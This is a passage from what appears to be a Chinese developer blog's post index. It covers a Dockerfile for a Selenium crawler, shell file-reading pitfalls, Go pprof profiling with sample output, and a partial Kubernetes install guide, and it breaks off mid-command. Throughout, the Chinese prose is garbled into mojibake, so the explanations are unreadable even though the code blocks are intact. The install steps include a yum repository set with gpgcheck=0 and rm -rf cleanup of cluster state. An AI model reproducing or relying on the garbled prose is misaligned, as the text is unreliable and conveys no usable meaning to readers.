å®‰è£…è½¯ä»¶åŒ…\n\nçˆ¬è™«ç”¨ python å†™çš„, å¹¶ä¸”ä½¿ç”¨äº† selenium + æ— å¤´æµè§ˆå™¨. æ‰€ä»¥å®‰è£…åŒ…è¦å†™åœ¨ dockerfileé‡Œ, æ–‡ä»¶å¦‚ä¸‹:\n\n```dockerfile\nFROM alpine\n\nRUN mkdir -p /zk8\nCOPY . /zk8/\n\n# install python\nRUN echo \"**** install python ****\" && \\\n                apk add --no-cache python3 && \\\n                if [ ! -e /usr/bin/python ]; then ln -sf python3 /usr/bin/python ; fi && \\\n                echo \"**** install pip ****\" && \\\n                python3 -m ensurepip && \\\n                rm -r /usr/lib/python*/ensurepip && \\\n                pip3 install --no-cache --upgrade pip setuptools wheel && \\\n                if [ ! -e /usr/bin/pip ]; then ln -s pip3 /usr/bin/pip ; fi\n\n# install python package\nRUN apk add --no-cache py-lxml && \\\n                apk add --no-cache chromium && \\\n                apk add --no-cache chromium-chromedriver && \\\n                if [ -e /usr/bin/chromedriver ]; then ln -s /usr/bin/chromedriver /zk8/chromedriver ; fi && \\\n                pip install selenium && \\\n                pip install bearychat && \\\n                pip install pyquery\n\n\nWORKDIR /zk8\nCMD python3 main.py\n```\n\n\n\n### 5. å‘å¸ƒåˆ° dockerhub\n\nå»ºè®®å»ºç«‹è‡ªå·±çš„ç§æœ‰ä»“åº“, å› ä¸º dockerhub å¯ä»¥å…è´¹ä½¿ç”¨ä¸€ä¸ªç§æœ‰ä»“åº“, æ­¤å¤„ä¸Šä¼ åˆ° dockerhub.\n\n```bash\ndocker login # ç™»å½•è‡ªå·±çš„ dockerhub å¸å·\n\ndocker tag zk8:0.1 levonfly/zk8:0.1 # æ­¤å¤„æ‰“ tag, æ ¼å¼è¦ä»¥ ç”¨æˆ·å/é•œåƒåå­—:ç‰ˆæœ¬å·\n\ndocker push levonfly/zk8:0.1 # æ¨é€åˆ° dockerhub\n```\n\ndockerhub ä¸Šè¿˜å¯ä»¥ link åˆ°github, å³ github ä¸€æ›´æ–°ä»£ç å°±é‡æ–° build.\n\næ¥ä¸‹æ¥å°±æ˜¯æ¿€åŠ¨äººå¿ƒçš„æ—¶åˆ», åœ¨ä»»ä½•å®‰è£… docker çš„æœºå™¨ä¸Šç›´æ¥è¿è¡Œè‡ªå·±çš„çˆ¬è™«.\n\n```bash\ndocker pull levonfly/zk8:0.1\ndocker run -d --name zk8 levonfly/zk8:0.1 \n```\n\n\n\n\n\n","tags":["docker"],"categories":["docker"]},{"title":"shellè¯»å–æ–‡ä»¶å†…å®¹é‡åˆ°çš„å‘","url":"%2Fp%2F67723314.html","content":"\næ–‡ä»¶å†…å®¹å¦‚ä¸‹, éœ€è¦æŠŠ1234è¯»å–èµ‹å€¼ç»™shellå†…éƒ¨çš„å˜é‡nodeid\n\n```\ncat a.conf\nnodeid 1234\n```\n\n<!-- more -->\n\nshellè§£ææ–‡ä»¶å¦‚ä¸‹\n\n```shell\n#!/bin/sh\n\nnodeid=0\n\n\nset_nodeid1(){\n\tcat a.conf | while read line\n\tdo\n\t\tif [[ $line == nodeid* ]];\n\t\tthen\n\t\t\t nodeid=${line:7}\n\t\tfi\n\tdone\n}\n\nset_nodeid2(){\n\tfor line in `cat a.conf`\n\tdo\n\t\tif [[ $line == nodeid* ]];\n\t\tthen\n\t\t\t nodeid=${line:7}\n\t\tfi\n\tdone\n}\n\nset_nodeid3(){\n\twhile read -r line\n\tdo\n\t\tif [[ $line == nodeid* ]];\n\t\tthen\n\t\t\t nodeid=${line:7}\n\t\tfi\n\tdone < a.conf\n}\n\n\nset_nodeid1\necho \"set_nodeid1 is $nodeid\"\nset_nodeid2\necho \"set_nodeid2 is $nodeid\"\nset_nodeid3\necho \"set_nodeid3 is $nodeid\"\n```\n\n\n\nè¾“å‡ºå†…å®¹å¦‚ä¸‹:\n\n```bash\nset_nodeid1 is 0\nset_nodeid2 is\nset_nodeid3 is 1234\n```\n\n\n\nç¬¬ä¸€ç§æ–¹å¼åˆ›å»ºäº†å­shell, èµ‹å€¼æ˜¯å­shellçš„, æ²¡æœ‰å½±å“åˆ°å…¨å±€å˜é‡.\n\nç¬¬äºŒç§æ–¹å¼, forå¾ªç¯çš„æ–¹å¼, å› ä¸ºa.confä¸­é—´ç©ºæ ¼å¯¼è‡´çš„,æŠŠä¸€è¡Œå¾ªç¯äº†ä¸¤æ¬¡, æ‰€ä»¥èµ‹å€¼äº†ç©º\n\nç¬¬ä¸‰ç§æ–¹å¼å¾—åˆ°æ­£ç¡®çš„ç»“æœ\n\n","tags":["shell"],"categories":["shell"]},{"title":"golangçš„pprofä½¿ç”¨","url":"%2Fp%2F771638a0.html","content":"\n# 1. quick start\n\n```go\npackage main\n\nimport (\n\t\"log\"\n\t\"net/http\"\n\t_ \"net/http/pprof\"\n)\n\nfunc main() {\n\tlog.Println(http.ListenAndServe(\"localhost:6060\", nil))\n}\n\n```\n\n<!-- more -->\n\næ‰“å¼€æµè§ˆå™¨, è¾“å…¥ `http://localhost:6060/debug/pprof/`, å†…å®¹æ˜¾ç¤ºå¦‚ä¸‹:\n\n```bash\n/debug/pprof/\n\nTypes of profiles available:\nCount\tProfile\n1\tallocs # å†…å­˜åˆ†é…æƒ…å†µçš„é‡‡æ ·ä¿¡æ¯\n0\tblock\t # é˜»å¡æ“ä½œæƒ…å†µçš„é‡‡æ ·ä¿¡æ¯\n0\tcmdline #\tæ˜¾ç¤ºç¨‹åºå¯åŠ¨å‘½ä»¤åŠå‚æ•°\n4\tgoroutine # å½“å‰æ‰€æœ‰åç¨‹çš„å †æ ˆä¿¡æ¯\n1\theap # å †ä¸Šå†…å­˜ä½¿ç”¨æƒ…å†µçš„é‡‡æ ·ä¿¡æ¯\n0\tmutex # é”äº‰ç”¨æƒ…å†µçš„é‡‡æ ·ä¿¡æ¯\n0\tprofile # CPU å ç”¨æƒ…å†µçš„é‡‡æ ·ä¿¡æ¯\n5\tthreadcreate # ç³»ç»Ÿçº¿ç¨‹åˆ›å»ºæƒ…å†µçš„é‡‡æ ·ä¿¡æ¯\n0\ttrace # ç¨‹åºè¿è¡Œè·Ÿè¸ªä¿¡æ¯\nfull goroutine stack dump\n```\n\nä¸Šé¢æ¯ä¸€ä¸ªéƒ½æ˜¯ä¸€ä¸ªè¶…é“¾æ¥, å¯ä»¥ç‚¹è¿›å», çœ‹åˆ°å †æ ˆä¿¡æ¯\n\n\n\n# 2. å‘½ä»¤æŸ¥çœ‹\n\n+ macéœ€è¦å®‰è£…graphviz\n\n    ```bash\n    brew install graphviz\n    # å¦‚æœä¸€ç›´ä¸‹è½½ä¸æˆåŠŸ, ä¿®æ”¹brewæº\n    ```\n    \n+ æŸ¥çœ‹å†…å­˜ä½¿ç”¨æƒ…å†µ\n\n  ```bash\n  go tool pprof http://localhost:6060/debug/pprof/heap\n  # è¿›å…¥å¦‚ä¸‹gdbäº¤äº’æ¨¡å¼:\n  \n  # top æŸ¥çœ‹å‰10ä¸ªçš„å†…å­˜åˆ†é…æƒ…å†µ\n  (pprof) top\n  Showing nodes accounting for 1.16MB, 100% of 1.16MB total\n        flat  flat%   sum%        cum   cum%\n      1.16MB   100%   100%     1.16MB   100%  runtime/pprof.writeGoroutineStacks\n           0     0%   100%     1.16MB   100%  net/http.(*ServeMux).ServeHTTP\n           0     0%   100%     1.16MB   100%  net/http.(*conn).serve\n           0     0%   100%     1.16MB   100%  net/http.HandlerFunc.ServeHTTP\n           0     0%   100%     1.16MB   100%  net/http.serverHandler.ServeHTTP\n           0     0%   100%     1.16MB   100%  net/http/pprof.Index\n           0     0%   100%     1.16MB   100%  net/http/pprof.handler.ServeHTTP\n           0     0%   100%     1.16MB   100%  runtime/pprof.(*Profile).WriteTo\n           0     0%   100%     1.16MB   100%  runtime/pprof.writeGoroutine\n           \n           \n  # tree ä»¥æ ‘çŠ¶æ˜¾ç¤º\n  (pprof) tree\n  Showing nodes accounting for 1.16MB, 100% of 1.16MB total\n  ----------------------------------------------------------+-------------\n        flat  flat%   sum%        cum   cum%   calls calls% + context\n  ----------------------------------------------------------+-------------\n                                              1.16MB   100% |   runtime/pprof.writeGoroutine\n      1.16MB   100%   100%     1.16MB   100%                | runtime/pprof.writeGoroutineStacks\n      \n      \n  # png ä»¥å›¾ç‰‡æ ¼å¼è¾“å‡º,åœ¨å½“å‰ç›®å½•ä¸‹\n  (pprof) png\n  Generating report in profile001.png\n  \n  # svg ç”Ÿæˆæµè§ˆå™¨å¯ä»¥è¯†åˆ«çš„svgæ–‡ä»¶,åœ¨å½“å‰ç›®å½•ä¸‹, ç›´æ¥ç‚¹å¼€åœ¨æµè§ˆå™¨æŸ¥çœ‹\n  (pprof) png\n  Generating report in profile001.png\n  ```\n  \n  \n  \n  | åˆ—å  | å«ä¹‰                                                         |\n  | ----- | ------------------------------------------------------------ |\n  | flat  | æœ¬å‡½æ•°çš„æ‰§è¡Œè€—æ—¶                                             |\n  | flat% | flat å  CPU æ€»æ—¶é—´çš„æ¯”ä¾‹ã€‚ç¨‹åºæ€»è€—æ—¶ 16.22s, Eat çš„ 16.19s å äº† 99.82% |\n  | sum%  | å‰é¢æ¯ä¸€è¡Œçš„ flat å æ¯”æ€»å’Œ                                   |\n  | cum   | ç´¯è®¡é‡ã€‚æŒ‡è¯¥å‡½æ•°åŠ ä¸Šè¯¥å‡½æ•°è°ƒç”¨çš„å‡½æ•°æ€»è€—æ—¶                   |\n  | cum%  | cum å  CPU æ€»æ—¶é—´çš„æ¯”ä¾‹                                      |\n  \n  \n\n\n# 3. å®è·µ\n\n```bash\n# ä¸‹è½½æµ‹è¯•é¡¹ç›®\ngit clone https://github.com/wolfogre/go-pprof-practice\n\n# æ‰§è¡Œ\ngo build\n./go-pprof-practice\n```\n\n\n\n### 3.1 æ’æŸ¥CPU\n\n```bash\ngo tool pprof http://localhost:6060/debug/pprof/profile\n\n# top æŸ¥çœ‹\n(pprof) top\nShowing nodes accounting for 15270ms, 99.09% of 15410ms total\nDropped 40 nodes (cum <= 77.05ms)\nShowing top 10 nodes out of 11\n      flat  flat%   sum%        cum   cum%\n   12310ms 79.88% 79.88%    12780ms 82.93%  github.com/wolfogre/go-pprof-practice/animal/felidae/tiger.(*Tiger).Eat\n    1170ms  7.59% 87.48%     1170ms  7.59%  runtime.memmove\n     800ms  5.19% 92.67%      800ms  5.19%  runtime.memclrNoHeapPointers\n     520ms  3.37% 96.04%     2500ms 16.22%  github.com/wolfogre/go-pprof-practice/animal/muridae/mouse.(*Mouse).Steal\n     470ms  3.05% 99.09%      470ms  3.05%  runtime.asyncPreempt\n         0     0% 99.09%    12780ms 82.93%  github.com/wolfogre/go-pprof-practice/animal/felidae/tiger.(*Tiger).Live\n         0     0% 99.09%     2500ms 16.22%  github.com/wolfogre/go-pprof-practice/animal/muridae/mouse.(*Mouse).Live\n         0     0% 99.09%    15310ms 99.35%  main.main\n         0     0% 99.09%     1980ms 12.85%  runtime.growslice\n         0     0% 99.09%    15310ms 99.35%  runtime.main\n         \n         \nå¾ˆæ˜æ˜¾ï¼ŒCPU å ç”¨è¿‡é«˜æ˜¯ github.com/wolfogre/go-pprof-practice/animal/felidae/tiger.(*Tiger).Eat é€ æˆçš„ã€‚   \n\n# è¾“å…¥ list Eatï¼ŒæŸ¥çœ‹é—®é¢˜å…·ä½“åœ¨ä»£ç çš„å“ªä¸€ä¸ªä½ç½®ï¼š\n\n(pprof) list Eat\nTotal: 15.41s\nROUTINE ======================== github.com/wolfogre/go-pprof-practice/animal/felidae/tiger.(*Tiger).Eat in /Users/liuwei/golang/pkg/mod/github.com/wolfogre/go-pprof-practice@v0.0.0-20190402114113-8ce266a210ee/animal/felidae/tiger/tiger.go\n    12.31s     12.78s (flat, cum) 82.93% of Total\n         .          .     19:}\n         .          .     20:\n         .          .     21:func (t *Tiger) Eat() {\n         .          .     22:   log.Println(t.Name(), \"eat\")\n         .          .     23:   loop := 10000000000\n    12.31s     12.78s     24:   for i := 0; i < loop; i++ {\n         .          .     25:           // do nothing\n         .          .     26:   }\n         .          .     27:}\n         .          .     28:\n         .          .     29:func (t *Tiger) Drink() {\n         \n\nå¯ä»¥çœ‹åˆ°ï¼Œæ˜¯ç¬¬ 24 è¡Œé‚£ä¸ªä¸€ç™¾äº¿æ¬¡ç©ºå¾ªç¯å ç”¨äº†å¤§é‡ CPU æ—¶é—´ï¼Œè‡³æ­¤ï¼Œé—®é¢˜å®šä½æˆåŠŸï¼\n\n\n# è¾“å…¥ web, ä¼šåœ¨æµè§ˆå™¨å¼¹å‡ºä¸€ä¸ªå›¾\nå›¾ä¸­ï¼Œtiger.(*Tiger).Eat å‡½æ•°çš„æ¡†ç‰¹åˆ«å¤§ï¼Œç®­å¤´ç‰¹åˆ«ç²—ï¼Œpprof ç”Ÿæ€•ä½ ä¸çŸ¥é“è¿™ä¸ªå‡½æ•°çš„ CPU å ç”¨å¾ˆé«˜ã€‚\n```\n\n![1](golangçš„pprofä½¿ç”¨/1.png)\n\n\n\n### 3.2 æ’æŸ¥å†…å­˜\n\n```bash\n# æŠŠæ­»å¾ªç¯ä»£ç æ³¨é‡Š, æ¥ç€æµ‹è¯•, çœ‹å†…å­˜ä½¿ç”¨, æ³¨æ„æ˜¯ heap\ngo tool pprof http://localhost:6060/debug/pprof/heap\n\n# çœ‹ top\n(pprof) top\nShowing nodes accounting for 768MB, 100% of 768MB total\n      flat  flat%   sum%        cum   cum%\n     768MB   100%   100%      768MB   100%  github.com/wolfogre/go-pprof-practice/animal/muridae/mouse.(*Mouse).Steal\n         0     0%   100%      768MB   100%  github.com/wolfogre/go-pprof-practice/animal/muridae/mouse.(*Mouse).Live\n         0     0%   100%      768MB   100%  main.main\n         0     0%   100%      768MB   100%  runtime.main\n\n# æŸ¥çœ‹å ç”¨æœ€å¤šçš„è¿™ä¸ªå‡½æ•°\n(pprof) list Steal\nTotal: 768MB\nROUTINE ======================== github.com/wolfogre/go-pprof-practice/animal/muridae/mouse.(*Mouse).Steal in /Users/liuwei/golang/pkg/mod/github.com/wolfogre/go-pprof-practice@v0.0.0-20190402114113-8ce266a210ee/animal/muridae/mouse/mouse.go\n     768MB      768MB (flat, cum)   100% of Total\n         .          .     45:\n         .          .     46:func (m *Mouse) Steal() {\n         .          .     47:   log.Println(m.Name(), \"steal\")\n         .          .     48:   max := constant.Gi\n         .          .     49:   for len(m.buffer) * constant.Mi < max {\n     768MB      768MB     50:           m.buffer = append(m.buffer, [constant.Mi]byte{})\n         .          .     51:   }\n         .          .     52:}\n         \nå¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œæœ‰ä¸ªå¾ªç¯ä¼šä¸€ç›´å‘ m.buffer é‡Œè¿½åŠ é•¿åº¦ä¸º 1 MiB çš„æ•°ç»„ï¼Œç›´åˆ°æ€»å®¹é‡åˆ°è¾¾ 1 GiB ä¸ºæ­¢ï¼Œä¸”ä¸€ç›´ä¸é‡Šæ”¾è¿™äº›å†…å­˜ï¼Œè¿™å°±éš¾æ€ªä¼šæœ‰è¿™ä¹ˆé«˜çš„å†…å­˜å ç”¨äº†ã€‚\n\n# è¾“å…¥ web, å†æ¬¡åœ¨æµè§ˆå™¨æ„Ÿå—ä¸€ä¸‹, ä¹Ÿå¯ä»¥è¾“å…¥ png\n```\n\n![1](golangçš„pprofä½¿ç”¨/2.png)\n\n\n\n### 3.3 æ’æŸ¥ GC\n\n```bash\n# é¢‘ç¹çš„ GC å¯¹ golang ç¨‹åºæ€§èƒ½çš„å½±å“ä¹Ÿæ˜¯éå¸¸ä¸¥é‡çš„ã€‚è™½ç„¶ç°åœ¨è¿™ä¸ªç¨‹åºå†…å­˜ä½¿ç”¨é‡å¹¶ä¸é«˜ï¼Œä½†è¿™ä¼šä¸ä¼šæ˜¯é¢‘ç¹ GC ä¹‹åçš„å‡è±¡å‘¢ï¼Ÿ\n\n# ä¸ºäº†è·å–ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­ GC æ—¥å¿—ï¼Œæˆ‘ä»¬éœ€è¦å…ˆé€€å‡ºç‚¸å¼¹ç¨‹åºï¼Œå†åœ¨é‡æ–°å¯åŠ¨å‰èµ‹äºˆä¸€ä¸ªç¯å¢ƒå˜é‡ï¼ŒåŒæ—¶ä¸ºäº†é¿å…å…¶ä»–æ—¥å¿—çš„å¹²æ‰°ï¼Œä½¿ç”¨ grep ç­›é€‰å‡º GC æ—¥å¿—æŸ¥çœ‹ï¼š\nGODEBUG=gctrace=1 ./go-pprof-practice | grep gc\n\ngc 1 @0.003s 2%: 0.004+0.44+0.004 ms clock, 0.004+0.21/0.11/0+0.004 ms cpu, 16->16->0 MB, 17 MB goal, 1 P\ngc 2 @6.201s 0%: 0.041+2.9+0.004 ms clock, 0.041+0.31/0/0+0.004 ms cpu, 7->7->6 MB, 8 MB goal, 1 P\ngc 3 @6.204s 0%: 0.026+6.2+0.003 ms clock, 0.026+0.23/0/0+0.003 ms cpu, 14->14->12 MB, 15 MB goal, 1 P\ngc 4 @6.211s 0%: 0.038+10+0.003 ms clock, 0.038+0.23/0/0+0.003 ms cpu, 28->28->24 MB, 29 MB goal, 1 P\ngc 5 @6.223s 0%: 0.023+26+0.002 ms clock, 0.023+0/0.23/0+0.002 ms cpu, 56->56->48 MB, 57 MB goal, 1 P\ngc 6 @6.251s 0%: 0.038+47+0.003 ms clock, 0.038+0/0.25/0+0.003 ms cpu, 112->112->96 MB, 113 MB goal, 1 P\ngc 7 @6.301s 0%: 0.051+93+0.003 ms clock, 0.051+0/0.24/0+0.003 ms cpu, 224->224->192 MB, 225 MB goal, 1 P\ngc 8 @6.407s 0%: 0.023+192+0.004 ms clock, 0.023+0/0.28/0+0.004 ms cpu, 448->448->384 MB, 449 MB goal, 1 P\ngc 9 @6.631s 0%: 0.053+397+0.003 ms clock, 0.053+0/0.25/0+0.003 ms cpu, 896->896->768 MB, 897 MB goal, 1 P\ngc 10 @7.080s 0%: 0.052+1205+0.003 ms clock, 0.052+0/0.24/0+0.003 ms cpu, 1792->1792->1536 MB, 1793 MB goal, 1 P\n\n\nå¯ä»¥çœ‹åˆ°ï¼ŒGC å·®ä¸å¤šæ¯ 3 ç§’å°±å‘ç”Ÿä¸€æ¬¡ï¼Œä¸”æ¯æ¬¡ GC éƒ½ä¼šä» 16MB æ¸…ç†åˆ°å‡ ä¹ 0MBï¼Œè¯´æ˜ç¨‹åºåœ¨ä¸æ–­çš„ç”³è¯·å†…å­˜å†é‡Šæ”¾ï¼Œè¿™æ˜¯é«˜æ€§èƒ½ golang ç¨‹åºæ‰€ä¸å…è®¸çš„ã€‚\n\næ‰€ä»¥æ¥ä¸‹æ¥ä½¿ç”¨ pprof æ’æŸ¥æ—¶ï¼Œæˆ‘ä»¬åœ¨ä¹çš„ä¸æ˜¯ä»€ä¹ˆåœ°æ–¹åœ¨å ç”¨å¤§é‡å†…å­˜ï¼Œè€Œæ˜¯ä»€ä¹ˆåœ°æ–¹åœ¨ä¸åœåœ°ç”³è¯·å†…å­˜ï¼Œè¿™ä¸¤è€…æ˜¯æœ‰åŒºåˆ«çš„ã€‚\n\n#ç”±äºå†…å­˜çš„ç”³è¯·ä¸é‡Šæ”¾é¢‘åº¦æ˜¯éœ€è¦ä¸€æ®µæ—¶é—´æ¥ç»Ÿè®¡çš„ï¼Œæ‰€æœ‰æˆ‘ä»¬ä¿è¯ç‚¸å¼¹ç¨‹åºå·²ç»è¿è¡Œäº†å‡ åˆ†é’Ÿä¹‹åï¼Œå†è¿è¡Œå‘½ä»¤ï¼š\ngo tool pprof http://localhost:6060/debug/pprof/allocs\n\n# top\n(pprof) top\nShowing nodes accounting for 16MB, 100% of 16MB total\n      flat  flat%   sum%        cum   cum%\n      16MB   100%   100%       16MB   100%  github.com/wolfogre/go-pprof-practice/animal/canidae/dog.(*Dog).Run (inline)\n         0     0%   100%       16MB   100%  github.com/wolfogre/go-pprof-practice/animal/canidae/dog.(*Dog).Live\n         0     0%   100%       16MB   100%  main.main\n         0     0%   100%       16MB   100%  runtime.main\n         \n# list Run         \n(pprof) list Run\nTotal: 16MB\nROUTINE ======================== github.com/wolfogre/go-pprof-practice/animal/canidae/dog.(*Dog).Run in /Users/liuwei/golang/pkg/mod/github.com/wolfogre/go-pprof-practice@v0.0.0-20190402114113-8ce266a210ee/animal/canidae/dog/dog.go\n      16MB       16MB (flat, cum)   100% of Total\n         .          .     38:   log.Println(d.Name(), \"pee\")\n         .          .     39:}\n         .          .     40:\n         .          .     41:func (d *Dog) Run() {\n         .          .     42:   log.Println(d.Name(), \"run\")\n      16MB       16MB     43:   _ = make([]byte, 16 * constant.Mi)\n         .          .     44:}\n         .          .     45:\n         .          .     46:func (d *Dog) Howl() {\n         .          .     47:   log.Println(d.Name(), \"howl\")\n         .          .     48:}\n         \n         \nå¯ä»¥çœ‹åˆ° github.com/wolfogre/go-pprof-practice/animal/canidae/dog.(*Dog).Run ä¼šè¿›è¡Œæ— æ„ä¹‰çš„å†…å­˜ç”³è¯·ï¼Œè€Œè¿™ä¸ªå‡½æ•°åˆä¼šè¢«é¢‘ç¹è°ƒç”¨ï¼Œè¿™æ‰å¯¼è‡´ç¨‹åºä¸åœåœ°è¿›è¡Œ GC\n```\n\n![1](golangçš„pprofä½¿ç”¨/3.png)\n\n### 3.4 æ’æŸ¥åç¨‹æ³„éœ²\n\n```bash\ngo tool pprof http://localhost:6060/debug/pprof/goroutine\n\n# top æŸ¥çœ‹\n(pprof) top\nShowing nodes accounting for 14, 100% of 14 total\nShowing top 10 nodes out of 27\n      flat  flat%   sum%        cum   cum%\n        12 85.71% 85.71%         12 85.71%  runtime.gopark\n         1  7.14% 92.86%          1  7.14%  net/http.(*connReader).backgroundRead\n         1  7.14%   100%          1  7.14%  runtime/pprof.writeRuntimeProfile\n         0     0%   100%         10 71.43%  github.com/wolfogre/go-pprof-practice/animal/canidae/wolf.(*Wolf).Drink.func1\n         0     0%   100%          1  7.14%  internal/poll.(*FD).Accept\n         0     0%   100%          1  7.14%  internal/poll.(*pollDesc).wait\n         0     0%   100%          1  7.14%  internal/poll.(*pollDesc).waitRead (inline)\n         0     0%   100%          1  7.14%  internal/poll.runtime_pollWait\n         0     0%   100%          1  7.14%  main.main\n         0     0%   100%          1  7.14%  main.main.func1\n\n# list å‡½æ•°\n(pprof) list Drink\nTotal: 14\nROUTINE ======================== github.com/wolfogre/go-pprof-practice/animal/canidae/wolf.(*Wolf).Drink.func1 in /Users/liuwei/golang/pkg/mod/github.com/wolfogre/go-pprof-practice@v0.0.0-20190402114113-8ce266a210ee/animal/canidae/wolf/wolf.go\n         0         10 (flat, cum) 71.43% of Total\n         .          .     29:\n         .          .     30:func (w *Wolf) Drink() {\n         .          .     31:   log.Println(w.Name(), \"drink\")\n         .          .     32:   for i := 0; i < 10; i++ {\n         .          .     33:           go func() {\n         .         10     34:                   time.Sleep(30 * time.Second)\n         .          .     35:           }()\n         .          .     36:   }\n         .          .     37:}\n         .          .     38:\n         .          .     39:func (w *Wolf) Shit() {\n         \nå¯ä»¥çœ‹åˆ°ï¼ŒDrink å‡½æ•°æ¯æ¬¡å›é‡Šæ”¾ 10 ä¸ªåç¨‹å‡ºå»ï¼Œæ¯ä¸ªåç¨‹ä¼šç¡çœ  30 ç§’å†é€€å‡ºï¼Œè€Œ Drink å‡½æ•°åˆä¼šè¢«åå¤è°ƒç”¨ï¼Œè¿™æ‰å¯¼è‡´å¤§é‡åç¨‹æ³„éœ²ï¼Œè¯•æƒ³ä¸€ä¸‹ï¼Œå¦‚æœé‡Šæ”¾å‡ºçš„åç¨‹ä¼šæ°¸ä¹…é˜»å¡ï¼Œé‚£ä¹ˆæ³„éœ²çš„åç¨‹æ•°ä¾¿ä¼šæŒç»­å¢åŠ ï¼Œå†…å­˜çš„å ç”¨ä¹Ÿä¼šæŒç»­å¢åŠ ï¼Œé‚£è¿Ÿæ—©æ˜¯ä¼šè¢«æ“ä½œç³»ç»Ÿæ€æ­»çš„ã€‚         \n```\n\n![1](golangçš„pprofä½¿ç”¨/4.png)\n\n### 3.5 æ’æŸ¥é”çš„äº‰ç”¨\n\n```bash\ngo tool pprof http://localhost:6060/debug/pprof/mutex\n\n\n# top æŸ¥çœ‹\n(pprof) top\nShowing nodes accounting for 1s, 100% of 1s total\n      flat  flat%   sum%        cum   cum%\n        1s   100%   100%         1s   100%  sync.(*Mutex).Unlock (inline)\n         0     0%   100%         1s   100%  github.com/wolfogre/go-pprof-practice/animal/canidae/wolf.(*Wolf).Howl.func1\n         \n# list å‡½æ•°       \n(pprof) list Howl\nTotal: 1s\nROUTINE ======================== github.com/wolfogre/go-pprof-practice/animal/canidae/wolf.(*Wolf).Howl.func1 in /Users/liuwei/golang/pkg/mod/github.com/wolfogre/go-pprof-practice@v0.0.0-20190402114113-8ce266a210ee/animal/canidae/wolf/wolf.go\n         0         1s (flat, cum)   100% of Total\n         .          .     53:\n         .          .     54:   m := &sync.Mutex{}\n         .          .     55:   m.Lock()\n         .          .     56:   go func() {\n         .          .     57:           time.Sleep(time.Second)\n         .         1s     58:           m.Unlock()\n         .          .     59:   }()\n         .          .     60:   m.Lock()\n         .          .     61:}\n         \nè¿™ä¸ªé”ç”±ä¸»åç¨‹ Lockï¼Œå¹¶å¯åŠ¨å­åç¨‹å» Unlockï¼Œä¸»åç¨‹ä¼šé˜»å¡åœ¨ç¬¬äºŒæ¬¡ Lock è¿™å„¿ç­‰å¾…å­åç¨‹å®Œæˆä»»åŠ¡ï¼Œä½†ç”±äºå­åç¨‹è¶³è¶³ç¡çœ äº†ä¸€ç§’ï¼Œå¯¼è‡´ä¸»åç¨‹ç­‰å¾…è¿™ä¸ªé”é‡Šæ”¾è¶³è¶³ç­‰äº†ä¸€ç§’é’Ÿã€‚         \n```\n\n![1](golangçš„pprofä½¿ç”¨/5.png)\n\n### 3.6 æ’æŸ¥é˜»å¡æ“ä½œ\n\n```bash\ngo tool pprof http://localhost:6060/debug/pprof/block\n\n# top list web å¤§æ³•\n```\n\n\n\n# 4. ç«ç„°å›¾\n\n```bash\n# åœ¨ä¸Šé¢ä¾‹å­ä¸­\ngo tool pprof -seconds 10 http://127.0.0.1:6060/debug/pprof/profile\n\ngo tool pprof -http=:8081 ~/pprof/pprof.samples.cpu.002.pb.gz\n\n# å¯ä»¥åœ¨é¡µé¢ä¸­ view->flamegraph æŸ¥çœ‹ç«ç„°å›¾\nhttp://localhost:8081/ui/flamegraph\n```\n\n![1](golangçš„pprofä½¿ç”¨/6.png)\n\n\n\n# 5. å‚è€ƒèµ„æ–™\n\n+ https://golang.org/pkg/net/http/pprof/\n+ https://blog.wolfogre.com/posts/go-ppof-practice/\n\n\n","tags":["golang"],"categories":["golang"]},{"title":"k8sçš„å®‰è£…å’Œä½¿ç”¨","url":"%2Fp%2Fcaa8b60.html","content":"\n# 1. å®‰è£…\n\n### 1.1 å®‰è£…å‰è¦æ±‚\n\nMasteræœåŠ¡å™¨è¦2GB RAM å’Œ 2ä¸ª CPU, dockerå’Œ k8s åœ¨ master å’Œ node èŠ‚ç‚¹éƒ½éœ€è¦å®‰è£….\n\n<!-- more -->\n\n### 1.2 å®‰è£…docker\n\n```bash\napt update\napt install docker.io\n```\n\n### 1.3 å®‰è£…k8s\n\n```bash\n# ubuntu å®‰è£…\ncurl -s https://packages.cloud.google.com/apt/doc/apt-key.gpg | sudo apt-key add -\n\ncat <<EOF | sudo tee /etc/apt/sources.list.d/kubernetes.list\ndeb https://apt.kubernetes.io/ kubernetes-xenial main\nEOF\n\napt update\napt install -y kubelet kubeadm kubectl\n\n\n# centos å®‰è£…\ncat <<EOF > /etc/yum.repos.d/kubernetes.repo\n[kubernetes]\nname=Kubernetes\nbaseurl=http://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64\nenabled=1\ngpgcheck=0\nrepo_gpgcheck=0\ngpgkey=http://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg http://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg\nEOF\n\nyum install -y kubelet kubeadm kubectl\n```\n\nä¿®æ”¹ç½‘ç»œé…ç½®\n\n```bash\ncat <<EOF > /etc/sysctl.d/k8s.conf\nnet.bridge.bridge-nf-call-ip6tables = 1\nnet.bridge.bridge-nf-call-iptables = 1\nEOF\n\nsysctl --system\n```\n\nç¦æ­¢ swap\n\n```bash\nswapoff -a\n```\n\n\n\n# 2. æ“ä½œ\n\n### 2.1 kubeadm åˆ›å»º\n\n```bash\nkubeadm init\n\n# æ˜¾ç¤ºä¸‹é¢å°±æ˜¯æˆåŠŸäº†\nYour Kubernetes control-plane has initialized successfully!\nkubeadm join 10.128.0.2:6443 --token essacx.dirj093suimneobu \\\n    --discovery-token-ca-cert-hash sha256:ccfba722f83313d31e27249300501ea88ef0560d7674b7a063fca5b2a3db357c\n```\n\nå¦‚æœå®‰è£…è¿‡ç¨‹å‡ºç°é—®é¢˜, é‡ç½®\n\n```bash\nkubeadm reset\nsystemctl stop kubelet\nsystemctl stop docker\nrm -rf /var/lib/cni/\nrm -rf /var/lib/calico/\nrm -rf /var/lib/kubelet/*\nrm -rf /etc/cni/\n\nsystemctl start docker\nsystemctl start kubelet\nkubeadm init\n```\n\n\n\n### 2.2 è·å– node ä¿¡æ¯\n\n```bash\nkubectl get nodes -o wide\n# æŠ¥é”™\nerror: no configuration has been provided, try setting KUBERNETES_MASTER environment variable\n\n# é rootç”¨æˆ·\nmkdir -p HOME/.kube\nsudo cp -i /etc/kubernetes/admin.conf HOME/.kube/config\nsudo chown (id -u):(id -g) $HOME/.kube/config\n\n#root ç”¨æˆ·\nexport 